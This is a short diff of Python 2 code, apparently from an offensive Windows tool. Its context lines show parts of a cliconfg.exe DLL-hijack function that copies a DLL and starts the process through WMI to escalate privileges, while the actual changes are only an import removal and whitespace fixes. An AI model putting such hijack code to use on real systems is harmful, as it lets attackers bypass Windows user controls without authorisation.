@@ -6,7 +6,6 @@ import os
 import wmi
 import shutil
 import ctypes
-import psutil
 import win32con
 from colorama import init, Fore
 init(convert=True)
@@ -23,7 +22,7 @@ def errorBox():
 	return (Fore.RED + '[-]' + Fore.RESET)
 
 def infoBox():
-	return (Fore.CYAN + '[!]' + Fore.RESET)	
+	return (Fore.CYAN + '[!]' + Fore.RESET)
 
 def warningBox():
 	return (Fore.YELLOW + '[!]' + Fore.RESET)
@@ -50,7 +49,7 @@ def cliconfig_dll_hijack():
 			print " {} cliconfig_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
 			return False
 
-		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):	
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
 			print " {} cliconfig_dll_hijack: Attempting to create process".format(infoBox())
 			try:
 				result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"cliconfg.exe")),
